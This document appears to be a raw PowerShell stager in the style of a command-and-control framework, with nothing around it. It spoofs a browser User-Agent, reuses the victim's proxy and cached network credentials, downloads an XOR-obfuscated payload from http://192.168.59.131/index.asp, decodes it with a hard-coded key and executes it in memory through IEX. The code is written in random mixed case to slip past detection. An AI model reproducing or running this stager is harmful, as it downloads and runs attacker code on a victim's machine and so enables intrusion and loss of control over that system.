
$wc=New-OBjeCT SyStEM.NEt.WEBClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEADeRS.ADD('User-Agent',$u);$wc.PRoXY = [SysTEm.Net.WebREQUeSt]::DefAuLtWeBPrOxY;$wc.PRoxy.CrEDeNTialS = [SysTem.NET.CreDEntiAlCAChe]::DEfaULtNetWORkCrEdENTIaLS;$K='F]o)SLi!.9e^MAtk+p*:37x{-Hd8&IQh';$I=0;[cHAR[]]$B=([cHAR[]]($wc.DOWNloadStRing("http://192.168.59.131:80/index.asp")))|%{$_-bXOR$K[$I++%$K.LENGtH]};IEX ($b-join'')

